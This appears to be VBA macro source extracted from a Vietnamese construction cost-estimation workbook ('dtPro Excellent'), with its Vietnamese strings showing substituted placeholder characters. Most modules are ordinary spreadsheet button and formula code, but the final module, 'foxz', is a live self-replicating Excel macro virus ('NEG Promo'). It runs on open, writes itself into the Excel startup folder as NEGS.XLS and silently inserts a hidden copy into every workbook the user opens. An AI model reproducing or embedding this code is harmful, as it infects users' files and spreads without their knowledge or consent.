Attribute VB_Control = "CmdChepCongThuc, 4, 2, MSForms, CommandButton"
Attribute VB_Control = "Label1, 5, 3, MSForms, Label"
Sub CmdChepCongThuc_Click()
    Range("th2dulieuct").FillDown
End Sub

Private Sub CmdTinhDGTH21_Click()
If Sheet7.ChkDTPhanTichVatLieu Then
    Sheet5.Range("id") = 6
    runfiledtpro
Else
    MsgBoxUni vni2uni("Ba|fffd|n pha|fffd|i cho|fffd|n pha|fffd|n t|fffd|ch Va|fffd|t lie|fffd|u trong ba|fffd|ng D|fffd||fffd| toa|fffd|n")
End If
End Sub

Private Sub CmdTinhDGTH22_Click()
If Sheet7.ChkDTPhanTichVatLieu And Sheet7.ChkDTPhanTichNhanCong And Sheet7.ChkDTPhanTichMay Then
    Sheet5.Range("id") = 7
    runfiledtpro
Else
    MsgBoxUni ("Ba|fffd|n pha|fffd|i cho|fffd|n pha|fffd|n t|fffd|ch ca|fffd| VL, NC, M trong ba|fffd|ng D|fffd||fffd| toa|fffd|n")
End If
End Sub
Attribute VB_Name = "Sheet2"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Sheet4"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Sheet5"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Control = "CmdChonThuMuc, 11, 0, MSForms, CommandButton"
Attribute VB_Control = "cmdChonFileDonGiaRieng, 14, 1, MSForms, CommandButton"
Sub cmdChonFileDonGiaRieng_Click()
 With Application.FileDialog(msoFileDialogOpen)
   .InitialFileName = "*.xls"
   .Title = vni2uni("Vui lo|fffd|ng l|fffd||fffd|a cho|fffd|n file dtPro 2012 la|fffd|m file |fffd||fffd|n gia|fffd| rie|fffd|ng cu|fffd|a ba|fffd|n")
   .Show
   If .SelectedItems.Count > 0 Then
     Range("cdfiledgrieng") = .SelectedItems(1)
   End If
 End With

End Sub

Sub CmdChonThuMuc_Click()
 With Application.FileDialog(msoFileDialogOpen)
   .InitialFileName = "dtProExl.exe"
   .Title = vni2uni("Vui lo|fffd|ng l|fffd||fffd|a cho|fffd|n th|fffd| mu|fffd|c dtPro Excellent!")
   .Show
   If .SelectedItems.Count > 0 Then
     Range("thumucdtpro") = Left(.SelectedItems(1), InStrRev(.SelectedItems(1), "\") - 1)
   End If
 End With
End Sub

Attribute VB_Name = "Sheet6"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Sheet7"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Control = "CmdTT, 3, 0, MSForms, CommandButton"
Attribute VB_Control = "CmdLayLaiDM, 22, 1, MSForms, CommandButton"
Attribute VB_Control = "CmdTinhBangDonGia, 21, 2, MSForms, CommandButton"
Attribute VB_Control = "CmdSuaDM, 225, 3, MSForms, CommandButton"
Attribute VB_Control = "Label3, 96, 4, MSForms, Label"
Attribute VB_Control = "Label2, 94, 5, MSForms, Label"
Attribute VB_Control = "LblXoaDong, 93, 6, MSForms, Label"
Attribute VB_Control = "LblChendong, 92, 7, MSForms, Label"
Attribute VB_Control = "CmdMaunendongcongviec, 310, 8, MSForms, CommandButton"
Attribute VB_Control = "CmdLayDG, 80, 9, MSForms, CommandButton"
Attribute VB_Control = "CmdDoiDonGia, 38, 10, MSForms, CommandButton"
Attribute VB_Control = "CmdLayLaiTB, 224, 11, MSForms, CommandButton"
Attribute VB_Control = "ChkChiTiet, 172, 12, MSForms, CheckBox"
Attribute VB_Control = "CmdTongKL, 147, 13, MSForms, CommandButton"
Attribute VB_Control = "Label1, 113, 15, MSForms, Label"
Attribute VB_Control = "CommandButton1, 341, 17, MSForms, CommandButton"
Attribute VB_Control = "CmdKieuBangDuToan, 307, 18, MSForms, CommandButton"
Attribute VB_Control = "CmdHienAnKichThuoc, 308, 19, MSForms, CommandButton"
Attribute VB_Control = "ChkDTPhanTichVatLieu, 337, 20, MSForms, CheckBox"
Attribute VB_Control = "ChkDTPhanTichNhanCong, 338, 21, MSForms, CheckBox"
Attribute VB_Control = "ChkDTPhanTichMay, 339, 22, MSForms, CheckBox"

Private Sub ChkChiTiet_Click()
    Range("dtcotmahieu").Select
    If Sheet7.ChkChiTiet.Value = False Then
        Selection.AutoFilter Field:=1, Criteria1:="<>"
        'Columns("F:L").Hidden = True
        'Sheet7.ChkKichThuoc.Value = False
    Else
        Selection.AutoFilter
        'Columns("F:L").Hidden = False
        'Sheet7.ChkKichThuoc.Value = True
    End If
End Sub

Private Sub ChkKichThuoc_Click()
    If Sheet7.ChkKichThuoc.Value = False Then
        Columns("F:L").Hidden = True
    Else
        Columns("F:L").Hidden = False
    End If
End Sub

Private Sub CmdHienAnKichThuoc_Click()
Select Case Me.CmdHienAnKichThuoc.Caption
    Case "[0]"
        Me.CmdHienAnKichThuoc.Caption = "[1]"
        Columns("F").Hidden = False
    Case "[1]"
        Me.CmdHienAnKichThuoc.Caption = "[2]"
        Columns("F:L").Hidden = False
    Case "[2]"
        Me.CmdHienAnKichThuoc.Caption = "[0]"
        Columns("F:L").Hidden = True
End Select

End Sub

Sub CmdKieuBangDuToan_Click()
Select Case Me.CmdKieuBangDuToan.Caption
    Case "[0]"
        Me.CmdKieuBangDuToan.Caption = "[1]"
        Columns("T:Z").Hidden = False
        Sheet5.Range("tenbangdutoan0") = Range("dtTenbang")
        Range("dtTenbang") = Sheet5.Range("tenbangdutoan1")
    Case "[1]"
        Me.CmdKieuBangDuToan.Caption = "[2]"
        Columns("T:Z").Hidden = True
        Columns("AA:AF").Hidden = False
        Sheet5.Range("tenbangdutoan1") = Range("dtTenbang")
        Range("dtTenbang") = Sheet5.Range("tenbangdutoan2")
    Case "[2]"
        Me.CmdKieuBangDuToan.Caption = "[3]"
        Columns("AA:AF").Hidden = True
        Columns("AG:AH").Hidden = False
        Sheet5.Range("tenbangdutoan2") = Range("dtTenbang")
        Range("dtTenbang") = Sheet5.Range("tenbangdutoan3")
    Case "[3]"
        Me.CmdKieuBangDuToan.Caption = "[4]"
        Columns("T:AH").Hidden = False
        Sheet5.Range("tenbangdutoan3") = Range("dtTenbang")
        Range("dtTenbang") = Sheet5.Range("tenbangdutoan4")
     Case "[4]"
        Me.CmdKieuBangDuToan.Caption = "[0]"
        Columns("T:AH").Hidden = True
        Sheet5.Range("tenbangdutoan4") = Range("dtTenbang")
        Range("dtTenbang") = Sheet5.Range("tenbangdutoan0")
End Select
End Sub

Private Sub CmdLayDG_Click()
    Sheet5.Range("id") = 12
    runfiledtpro
End Sub

Private Sub CmdLayLaiDM_Click()
    chuoithongbao = vni2uni("Ch|fffd||fffd|c na|fffd|ng na|fffd|y se|fffd| la|fffd|y la|fffd|i |fffd||fffd|nh m|fffd||fffd|c t|fffd||fffd| |fffd||fffd|nh m|fffd||fffd|c go|fffd|c cho ta|fffd|t ca|fffd| ca|fffd|c co|fffd|ng vie|fffd|c co|fffd| trong bo|fffd| |fffd|G|fffd|M. Nh|fffd||fffd|ng s|fffd||fffd|a |fffd|o|fffd|i |fffd||fffd|nh m|fffd||fffd|c (ne|fffd|u co|fffd|) cu|fffd|a ba|fffd|n se|fffd| b|fffd| xo|fffd|a, tuy nhie|fffd|n nh|fffd||fffd|ng |fffd||fffd|n gia|fffd| GTT kho|fffd|ng b|fffd| a|fffd|nh h|fffd||fffd||fffd|ng. Ba|fffd|n co|fffd| muo|fffd|n tie|fffd|p tu|fffd|c kho|fffd|ng?")
    bienchon = MsgBoxUni(chuoithongbao, vbYesNo, "dtPro Excellent!")
    If bienchon = 6 Then
        Sheet5.Range("id") = 20
        runfiledtpro
    End If
End Sub

Private Sub CmdLayLaiTB_Click()
    chuoithongbao = vni2uni("Ch|fffd||fffd|c na|fffd|ng na|fffd|y se|fffd| la|fffd|y te|fffd|n co|fffd|ng vie|fffd|c, |fffd|VT, |fffd||fffd|n gia|fffd|, |fffd||fffd|nh m|fffd||fffd|c ... cho ta|fffd|t ca|fffd| ca|fffd|c co|fffd|ng vie|fffd|c. Ba|fffd|n co|fffd| muo|fffd|n tie|fffd|p tu|fffd|c kho|fffd|ng?")
    bienchon = MsgBoxUni(chuoithongbao, vbYesNo, "dtPro Excellent!")
    If bienchon = 6 Then
        Sheet5.Range("id") = 21
        runfiledtpro
    End If
End Sub

Private Sub CmdMaunendongcongviec_Click()
Select Case Me.CmdMaunendongcongviec.Caption
    Case "[0]"
        Me.CmdMaunendongcongviec.Caption = "[1]"
        Range("dtdulieu_format2").Copy
        Range("dtdulieu").PasteSpecial Paste:=xlPasteFormats, Operation:=xlNone, SkipBlanks:=False, Transpose:=False
        Application.CutCopyMode = False
    Case "[1]"
        Me.CmdMaunendongcongviec.Caption = "[2]"
        Range("dtdulieu_format").Copy
        Range("dtdulieu").PasteSpecial Paste:=xlPasteFormats, Operation:=xlNone, SkipBlanks:=False, Transpose:=False
        Application.CutCopyMode = False
    Case "[2]"
        Me.CmdMaunendongcongviec.Caption = "[0]"
        Range("dtdulieu").FormatConditions.Delete
End Select
End Sub

Sub CmdSuaDM_Click()
        Sheet8.Visible = True
        Sheet5.Range("id") = 22
        runfiledtpro
        Sheet8.CmdTinhBangPhanTich.Enabled = False
End Sub

Private Sub CmdTongKL_Click()
CmdTT_Click
End Sub

Sub CmdTT_Click()
    bienluucal = Application.Calculation
    Application.Calculation = xlCalculationManual
    hmj = 1
    j = 1
    k = 2
    biencuoibang = True
    For I = 1 To Range("dtdulieu").Rows.Count - 2
        If Cells(Range("dtdulieu").Row + I, 11).Formula = "" Or _
            Right(Cells(Range("dtdulieu").Row + I, 11).Formula, 2) = "+0" Then
            Cells(Range("dtdulieu").Row + I, 11).FormulaR1C1 = "=product(Rc[-5]:rc[-1])+0"
            Cells(Range("dtdulieu").Row + I, 11).Font.ColorIndex = Cells(Range("dtdulieu").Row + I, 10).Font.ColorIndex
        Else
            Cells(Range("dtdulieu").Row + I, 11).Font.ColorIndex = Range("dtmauctnguoidungtulap").Font.ColorIndex
        End If
        If Cells(Range("dtdulieu").Row + I, 3).text <> "" Then
            If Left(Cells(Range("dtdulieu").Row + I, 3).text, 1) = "#" Then
                If hmj < 27 Then
                    Cells(Range("dtdulieu").Row + I, 1) = Chr(64 + hmj)
                Else
                    Cells(Range("dtdulieu").Row + I, 1) = "#" + Str(hmj)
                End If
                hmj = hmj + 1
                j = 1
            Else
                Cells(Range("dtdulieu").Row + I, 1) = j
                j = j + 1
            End If
        End If
        If Columns("F:L").Hidden = False Then
            If Cells(Range("dtdulieu").Row + Range("dtdulieu").Rows.Count - I - 1, 3).text <> "" Then
                If Cells(Range("dtdulieu").Row + Range("dtdulieu").Rows.Count - I - 1, 13).Formula = "" Or _
                    Right(Cells(Range("dtdulieu").Row + Range("dtdulieu").Rows.Count - I - 1, 13).Formula, 2) = "+0" Then
                    Cells(Range("dtdulieu").Row + Range("dtdulieu").Rows.Count - I - 1, 13).FormulaR1C1 = _
                        "=product(sum(rc[-2]:r[" & Trim(Str(k - 1)) & "]c[-2]),rc[-1])+0"
                    Cells(Range("dtdulieu").Row + Range("dtdulieu").Rows.Count - I - 1, 13).Font.ColorIndex = Cells(Range("dtdulieu").Row + Range("dtdulieu").Rows.Count - I - 1, 12).Font.ColorIndex
                Else
                    Cells(Range("dtdulieu").Row + Range("dtdulieu").Rows.Count - I - 1, 13).Font.ColorIndex = Range("dtmauctnguoidungtulap").Font.ColorIndex
                End If
                k = 1
            Else
                'If biencuoibang = True Then
                '    If Cells(Range("dtdulieu").Row + Range("dtdulieu").Rows.Count - I - 1, 11) = 0 Then
                '        k = 0
                '    Else
                '        biencuoibang = False
                '    End If
                'End If
                k = k + 1
            End If
        End If
    Next
    If bienluucal = -4105 Then
        Application.Calculation = xlCalculationAutomatic
    End If
    'Range("dtdulieu").Select
End Sub
Sub CmdTinhBangDonGia_Click()
        'CmdTT_Click
        Sheet8.Visible = True
        Sheet5.Range("id") = 2
        runfiledtpro
        Sheet8.CmdTinhBangPhanTich.Enabled = True
End Sub

Private Sub CmdDoiDonGia_Click()
        Sheet5.Range("id") = 11
        runfiledtpro
End Sub

Private Sub CommandButton1_Click()
caidatf11
End Sub

Sub LblChendong_Click()
    If Selection.Row >= Range("dtdulieu").Row Then
        Rows(Trim(Str(Selection.Row + 1)) + ":" + Trim(Str(Selection.Row + Selection.Rows.Count))).Insert
        Cells(Selection.Row + 1, Selection.Column).Select
    End If
End Sub

Sub LblXoaDong_Click()
    If Selection.Row > Range("dtdulieu").Row And Selection.Row + Selection.Rows.Count - 1 < Range("dtdulieu").Row + Range("dtdulieu").Rows.Count - 1 Then
        Rows(Trim(Str(Selection.Row)) + ":" + Trim(Str(Selection.Row + Selection.Rows.Count - 1))).Delete
        Cells(Selection.Row, Selection.Column).Select
    End If
End Sub

Private Sub Worksheet_Change(ByVal Target As Range)
If Target.Count = 1 And Target.Row >= Range("dtdulieu").Row And Target.Row < Range("dtdulieu").Row + Range("dtdulieu").Rows.Count Then
    Select Case Target.Column
    Case 3
        If Sheet5.Range("masorun") = 1 Or IsEmpty(Target.Value) Then
            Exit Sub
        End If
        If InStr(Target.Value, "*") > 0 Or UCase(Left(Target.Value, 3)) = "GTT" Then
            Cells(Target.Row, 2) = Target.Value
            Cells(Target.Row, 24).FormulaR1C1 = "=RC[-11]*RC[-4]"
            Cells(Target.Row, 25).FormulaR1C1 = "=product(RC[-12]*RC[-4],RC[-2])"
            Cells(Target.Row, 26).FormulaR1C1 = "=product(RC[-13]*RC[-4],RC[-3])"
            Cells(Target.Row, 30).FormulaR1C1 = "=RC[-17]*RC[-3]"
            Cells(Target.Row, 31).FormulaR1C1 = "=RC[-18]*RC[-3]"
            Cells(Target.Row, 32).FormulaR1C1 = "=RC[-19]*RC[-3]"
            Cells(Target.Row, 34).FormulaR1C1 = "=RC[-21]*RC[-1]"
            Cells(Target.Row, 15) = "Nha|fffd|n co|fffd|ng 3,5/7|co|fffd|ng|1"
            Cells(Target.Row, 16) = "Ma|fffd|y abc|ca|1"
            If UCase(Left(Target.Value, 3)) = "GTT" Then
                Cells(Target.Row, 14) = "GTT"
            End If
            CmdTT_Click
            Exit Sub
        End If
        If Left(Target.Value, 1) = "#" Then
            Exit Sub
        End If
        ' bat dau hien bang chon don gia
        If Left(Target.Value, 1) = "+" Then ' hien bang chon rieng
            If Dir(Sheet5.Range("cdfiledgrieng")) = "" Then
                chuoithongbao = vni2uni("Kho|fffd|ng t|fffd|m tha|fffd|y file |fffd||fffd|n gia|fffd| rie|fffd|ng ta|fffd|i th|fffd| mu|fffd|c na|fffd|y. Ba|fffd|n ha|fffd|y cho|fffd|n va|fffd| th|fffd||fffd| la|fffd|i")
                bienchon = MsgBoxUni(chuoithongbao, vbOKOnly, "dtPro Excellent!")
                Sheet5.cmdChonFileDonGiaRieng_Click
            Else
                Dim ten As Workbook
                tenfile = Mid(Sheet5.Range("cdfiledgrieng"), InStrRev(Sheet5.Range("cdfiledgrieng"), "\") + 1)
                filedgrieng = Mid(tenfile, 1, InStrRev(tenfile, ".") - 1)
                filedamo = False
                For Each ten In Application.Workbooks
                    If ten.Name = tenfile Then
                         filedamo = True
                    End If
                Next
                If filedamo = False Then
                    cuasohienthoi = ActiveWindow.Caption
                    Workbooks.Open (Sheet5.Range("cdfiledgrieng"))
                    Application.Windows(cuasohienthoi).Activate
                    'Application.Windows(filedgrieng).Visible = False
                End If
                'frmChonDonGia.LsbChonDonGia.RowSource = "=[dgPro-1.xls]DuToan!dtdulieu"
                frmChonDonGia.LsbChonDonGia.RowSource = "=[" + tenfile + "]DuToan!dtdulieu"
                Sheet5.Range("masorun") = 1
                frmChonDonGia.Show
                Sheet5.Range("masorun") = 0
            End If
        Else    'hien bang chon trong dtPro
            Sheet5.Range("masorun") = 1
            Sheet5.Range("id") = 1
            runfiledtpro
            CmdTT_Click
        End If
        Target.Select
        CmdTT_Click
    Case 4
        If Cells(Target.Row, 3) = "" And InStr(Target.Value, ":") > 0 Then
            On Error GoTo xulycongthucsai
                Cells(Target.Row, 6).Value = Replace(Replace("=" & Right(Target, Len(Target) - InStr(Target.Value, ":")), ",", "."), "x", "*")
        End If
    Case 0 '6 To 10
        If Left(Cells(Target.Row, 11).Formula, 1) <> "=" Then
            Cells(Target.Row, 11).FormulaR1C1 = "=product(Rc[-5]:rc[-1])"
        End If
    Case 0 '11
            'biendonghienthoi = Target.Row
            'Cells(Target.Row, 14) = "def"
            If (Cells(Target.Row + 1, 11).text) = "" Or (Not (Cells(Target.Row + 1, 3).text) <> "") Then
                j = 0
                Do While (Cells(Target.Row - j, 3).text) = ""
                    j = j + 1
                Loop
                Cells(Target.Row - j, 13).FormulaR1C1 = "=product(sum(rc[-2]:r[" & Trim(Str(j)) & "]c[-2]),rc[-1])"
            '    Cells(Target.Row, 13) = "abc"
            End If
    
    End Select
End If
Exit Sub
xulycongthucsai:
Cells(Target.Row, 6).Value = "#VALUE"
'MsgBox "Cong thuc sai, ban hay nhap lai"
'Target.Select loi khi chuyen du lieu tu 2008
Resume Next

End Sub

Private Sub Worksheet_SelectionChange(ByVal Target As Range)
biendonghienthoi = Target.Row
If biendonghienthoi = Range("dtdulieu").Row + Range("dtdulieu").Rows.Count - 1 And _
    Target.Column > 3 And Target.Column < 12 Then
    Rows(Selection.Row).Insert
End If
End Sub

Attribute VB_Name = "Sheet8"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Control = "Label1, 3, 0, MSForms, Label"
Attribute VB_Control = "CmdTinhBangPhanTich, 2, 1, MSForms, CommandButton"
Attribute VB_Control = "Label2, 4, 2, MSForms, Label"
Attribute VB_Control = "CmdLuuDinhMuc, 9, 3, MSForms, CommandButton"
Attribute VB_Control = "CmdKieuBangPhanTich, 10, 4, MSForms, CommandButton"

Private Sub CmdKieuBangPhanTich_Click()
Select Case Me.CmdKieuBangPhanTich.Caption
    Case "[0]"
        Me.CmdKieuBangPhanTich.Caption = "[1]"
        Columns("I:M").Hidden = False
    Case "[1]"
        Me.CmdKieuBangPhanTich.Caption = "[2]"
        Columns("M").Hidden = True
        Columns("N").Hidden = False
    Case "[2]"
        Me.CmdKieuBangPhanTich.Caption = "[3]"
        Columns("M").Hidden = False
    Case "[3]"
        Me.CmdKieuBangPhanTich.Caption = "[0]"
        Columns("I:N").Hidden = True
End Select
End Sub

Sub CmdLuuDinhMuc_Click()
   Sheet5.Range("id") = 31
   runfiledtpro
   'Sheet8.CmdTinhBangPhanTich.Enabled = True
End Sub

Sub CmdTinhBangPhanTich_Click()
   If Sheet8.CmdTinhBangPhanTich.Enabled = True Then
        Sheet9.Visible = True
        Sheet5.Range("id") = 3
        runfiledtpro
   End If
End Sub



Private Sub Worksheet_Change(ByVal Target As Range)
If Target.Count = 1 And _
    Target.Row >= Range("ptdulieu").Row And Target.Row < Range("ptdulieu").Row + Range("ptdulieu").Rows.Count And _
    Target.Column = 4 And _
    Left(Cells(Target.Row, 4).text, 5) <> "     " And IsEmpty(Cells(Target.Row, 3)) Then
    
    'Cells(Target.Row, 6) = "(*)"
    I = 1
    Do While IsEmpty(Cells(Target.Row - I, 3))
        I = I + 1
    Loop
    'Cells(Target.Row - I, 7).Value = " ***"
    If IsEmpty(Cells(Target.Row, 8)) Or IsEmpty(Cells(Target.Row, 9)) Or IsEmpty(Cells(Target.Row, 10)) Then
    ' Dong moi
            Cells(Target.Row, 8).Formula = "=$F$" + Trim(Str(Target.Row - I)) + "*G" + Trim(Str(Target.Row))
            Cells(Target.Row, 9).Formula = "=VLOOKUP(D" + Trim(Str(Target.Row)) + ",hpvunghp,6,0)"
            Cells(Target.Row, 10).FormulaR1C1 = "=RC[-3]*RC[-1]"
    End If
End If
End Sub

Private Sub Worksheet_SelectionChange(ByVal Target As Range)
If Target.Column = 4 And IsEmpty(Target.Value) Then
    'Worksheet_Change()
    'Target.Value = " "
End If
End Sub
Attribute VB_Name = "Sheet9"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Control = "ChkHPHienAnNhanCong, 15, 5, MSForms, CheckBox"
Attribute VB_Control = "ChkHPHienAnVatLieu, 14, 6, MSForms, CheckBox"
Attribute VB_Control = "CmdGhiGiaHaoPhi, 8, 7, MSForms, CommandButton"
Attribute VB_Control = "CmdKieuBangHaoPhi, 23, 8, MSForms, CommandButton"
Attribute VB_Control = "CmdLayGiaHaoPhi, 19, 9, MSForms, CommandButton"
Attribute VB_Control = "ChkHPHienAnMay, 16, 10, MSForms, CheckBox"
Attribute VB_Control = "CmdSapXep, 17, 11, MSForms, CommandButton"
Attribute VB_Control = "CmdSTT, 18, 12, MSForms, CommandButton"

Private Sub ChkHPHienAnVatLieu_Click()
If Sheet9.ChkHPHienAnVatLieu.Value Then
    Rows(Trim(Str(Range("hpdulieuvl").Row)) + ":" + Trim(Str(Range("hpdulieuvl").Row + Range("hpdulieuvl").Rows.Count - 1))).Hidden = False
Else
    Rows(Trim(Str(Range("hpdulieuvl").Row)) + ":" + Trim(Str(Range("hpdulieuvl").Row + Range("hpdulieuvl").Rows.Count - 1))).Hidden = True
End If
End Sub

Private Sub ChkHPHienAnNhanCong_Click()
If Sheet9.ChkHPHienAnNhanCong.Value Then
    Rows(Trim(Str(Range("hpdulieunc").Row)) + ":" + Trim(Str(Range("hpdulieunc").Row + Range("hpdulieunc").Rows.Count - 1))).Hidden = False
Else
    Rows(Trim(Str(Range("hpdulieunc").Row)) + ":" + Trim(Str(Range("hpdulieunc").Row + Range("hpdulieunc").Rows.Count - 1))).Hidden = True
End If

End Sub

Private Sub ChkHPHienAnMay_Click()
If Sheet9.ChkHPHienAnMay.Value Then
    Rows(Trim(Str(Range("hpdulieum").Row)) + ":" + Trim(Str(Range("hpdulieum").Row + Range("hpdulieum").Rows.Count - 1))).Hidden = False
Else
    Rows(Trim(Str(Range("hpdulieum").Row)) + ":" + Trim(Str(Range("hpdulieum").Row + Range("hpdulieum").Rows.Count - 1))).Hidden = True
End If

End Sub

Sub CmdGhiGiaHaoPhi_Click()
   Sheet5.Range("id") = 15
   runfiledtpro
End Sub

Private Sub CmdKieuBangHaoPhi_Click()
Select Case Me.CmdKieuBangHaoPhi.Caption
    Case "[0]"
        Me.CmdKieuBangHaoPhi.Caption = "[1]"
        Columns("I").Hidden = False
    Case "[1]"
        Me.CmdKieuBangHaoPhi.Caption = "[2]"
        Columns("G").Hidden = False
        Columns("L").Hidden = False
    Case "[2]"
        Me.CmdKieuBangHaoPhi.Caption = "[3]"
        Columns("L").Hidden = True
        Columns("H").Hidden = False
        Columns("J:K").Hidden = False
    Case "[3]"
        Me.CmdKieuBangHaoPhi.Caption = "[4]"
        Columns("L").Hidden = False
    Case "[4]"
        Me.CmdKieuBangHaoPhi.Caption = "[0]"
        Columns("G:L").Hidden = True
End Select
End Sub

Private Sub CmdLayGiaHaoPhi_Click()
   Sheet5.Range("id") = 16
   runfiledtpro
End Sub

Private Sub CmdSapXep_Click()
    Application.Calculation = xlCalculationManual
    '   SAP XEP VAT LIEU
    Range("A" + Trim(Str(Range("hpdulieuvl").Row + 1)) + ":M" + Trim(Str(Range("hpdulieuvl").Row + Range("hpdulieuvl").Rows.Count - 3))).Select
    Selection.Sort Key1:=Range("B" + Trim(Str(Range("hpdulieuvl").Row + 1))), Order1:=xlAscending, Key2:=Range("D" + Trim(Str(Range("hpdulieuvl").Row + 1)) _
        ), Order2:=xlAscending, Header:=xlGuess, _
        OrderCustom:=1, MatchCase:=False, Orientation:=xlTopToBottom, _
        DataOption1:=xlSortNormal
    For I = 1 To Range("hpdulieuvl").Rows.Count - 3
        Cells(Range("hpdulieuvl").Row + I, 1) = I
    Next
    '   SAP XEP NHAN CONG
    Range("A" + Trim(Str(Range("hpdulieunc").Row + 1)) + ":M" + Trim(Str(Range("hpdulieunc").Row + Range("hpdulieunc").Rows.Count - 3))).Select
    Selection.Sort Key1:=Range("D" + Trim(Str(Range("hpdulieunc").Row + 1))), Order1:=xlAscending, Header:=xlGuess, _
        OrderCustom:=1, MatchCase:=False, Orientation:=xlTopToBottom, _
        DataOption1:=xlSortNormal
    For I = 1 To Range("hpdulieunc").Rows.Count - 3
        Cells(Range("hpdulieunc").Row + I, 1) = I
    Next
    '   SAP XEP MAY
    Range("A" + Trim(Str(Range("hpdulieum").Row + 1)) + ":M" + Trim(Str(Range("hpdulieum").Row + Range("hpdulieum").Rows.Count - 3))).Select
    Selection.Sort Key1:=Range("D" + Trim(Str(Range("hpdulieum").Row + 1))), Order1:=xlAscending, Header:=xlGuess, _
        OrderCustom:=1, MatchCase:=False, Orientation:=xlTopToBottom, _
        DataOption1:=xlSortNormal
    For I = 1 To Range("hpdulieum").Rows.Count - 3
        Cells(Range("hpdulieum").Row + I, 1) = I
    Next
    Cells(Range("hpdulieuvl").Row + 1, 4).Select
    Application.Calculation = xlCalculationAutomatic
End Sub

Private Sub CmdSTT_Click()
    CmdSapXep_Click
End Sub

Attribute VB_Name = "ThisWorkbook"
Attribute VB_Base = "0{00020819-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Private Sub Workbook_Activate()
    Application.OnKey "{f9}", "caidatf9"
    Application.OnKey "{f10}", "caidatf10"
    Application.OnKey "{f11}", "caidatf11"
    Application.OnKey "{f12}", "sheet7.CmdTT_Click"
    Application.OnKey "^{insert}", "caidatctrlins"
    Application.OnKey "^{delete}", "caidatctrldel"
End Sub

Private Sub Workbook_Deactivate()
    Application.OnKey "{f9}"
    Application.OnKey "{f10}"
    Application.OnKey "{f11}"
    Application.OnKey "{f12}"
    Application.OnKey "^{insert}"
    Application.OnKey "^{delete}"
End Sub


Private Sub Workbook_Open()
'Application.MoveAfterReturnDirection = xlToRight
Sheet5.Range("masorun").Value = 0
On Error Resume Next
Set doituongreg = CreateObject("WScript.Shell")
Sheet5.Range("thumucdtpro").Value = doituongreg.RegRead("HKEY_CURRENT_USER\Software\dtProExl\curdir")
End Sub
Attribute VB_Name = "ccDutoan"
Attribute VB_Base = "0{6919EF3B-0AE5-4CDD-9247-F5CA23CF625B}{5AB06C1A-FF0E-4062-BF6B-B90781FFF76E}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
Attribute VB_Name = "foxz"

'donwload NEG!!! NoMercyExcelGenerator form NoMercyPage!
'foxz@usa.net


Sub auto_open()
Attribute auto_open.VB_Description = "\n\n \n\n\n|fffd|\n"
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
    Application.OnSheetActivate = "check_files"
End Sub

Sub check_files()
Attribute check_files.VB_Description = "\n\n \n\n\n|fffd|\n"
    c$ = Application.StartupPath
    m$ = Dir(c$ & "\" & "NEGS.XLS")
    If m$ = "NEGS.XLS" Then p = 1 Else p = 0
    If ActiveWorkbook.Modules.Count > 0 Then w = 1 Else w = 0
    whichfile = p + w * 10
    
Select Case whichfile
    Case 10
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    Sheets("foxz").Visible = True
    Sheets("foxz").Select
    Sheets("foxz").Copy
    With ActiveWorkbook
        .Title = ""
        .Subject = ""
        .Author = ""
        .Keywords = ""
        .Comments = "infected by NEG Promo!"
    End With
    newname$ = ActiveWorkbook.Name
    c4$ = CurDir()
    ChDir Application.StartupPath
    ActiveWindow.Visible = False
    Workbooks(newname$).SaveAs FileName:=Application.StartupPath & "/" & "NEGS.XLS", FileFormat:=xlNormal _
        , Password:="", WriteResPassword:="", ReadOnlyRecommended:= _
        False, CreateBackup:=False
    ChDir c4$
    Workbooks(n4$).Sheets("foxz").Visible = False
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "NEGS.XLS!check_files"
    Case 1
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    p4$ = ActiveWorkbook.path
    s$ = Workbooks(n4$).Sheets(1).Name
    If s$ <> "foxz" Then
        Workbooks("NEGS.XLS").Sheets("foxz").Copy before:=Workbooks(n4$).Sheets(1)
        Workbooks(n4$).Sheets("foxz").Visible = False
    Else
    End If
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "NEGS.XLS!check_files"
